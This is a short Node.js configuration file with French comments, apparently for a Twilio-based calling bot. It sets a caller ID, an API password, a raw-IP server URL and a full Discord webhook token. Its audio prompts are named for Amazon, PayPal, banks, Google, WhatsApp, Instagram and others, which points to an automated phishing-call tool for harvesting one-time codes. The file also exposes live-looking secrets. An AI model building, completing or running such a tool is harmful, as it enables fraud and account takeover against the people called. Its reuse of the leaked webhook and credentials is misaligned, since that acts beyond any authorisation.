module.exports = {
    setupdone: 'true',

    /**
     * Informations à propos du compte Twilio
     */
    accountSid: '',
    authToken: '',
    callerid: '+18127063327',

    /**
     * Informations à propos de l'API
     */
    apipassword: '5e320093e019bf3ffe3e9d1b73a64caac1737907d70f8eba19add2f6c4633006',
    serverurl: 'http://157.230.233.113:1337',

    /**
     * Informations à propos du webhook discord
     */
    discordwebhook: 'https://discord.com/api/webhooks/906064844350971934/emF9sF6nQjEjRRIDufV3XM4CHXXMEMf-cnUZqikHMDm-0m_3vRWtv4s7MZvdpmlVEhMr',

    /**
     * Port sur lequel tourne le serveur express
     */
    port: process.env.PORT || 1337,

    /**
     * Chemins de stockage des fichiers audios
     */
    amazonfilepath: './voice/fr/amazon/ask-amazon.mp3',
    cdiscountfilepath: './voice/fr/cdiscount/ask-cdiscount.mp3',
    twitterfilepath: './voice/fr/twitter/ask-twitter.mp3',
    whatsappfilepath: './voice/fr/whatsapp/ask-whatsapp.mp3',
    paypalfilepath: './voice/fr/paypal/ask-pp.mp3',
    googlefilepath: './voice/fr/google/ask-google.mp3',
    snapchatfilepath: './voice/fr/snapchat/ask-snapchat.mp3',
    instagramfilepath: './voice/fr/instagram/ask-instagram.mp3',
    facebookfilepath: './voice/fr/facebook/ask-facebook.mp3',
    endfilepath: './voice/fr/done/call-done.mp3',
    defaultfilepath: './voice/fr/default/ask-default.mp3',
    banquefilepath: './voice/fr/banque/ask-banque.mp3',

    /**
     * Contenu des sms selon les services demandés
     */
    paypalsms: 'pp test 123'
};
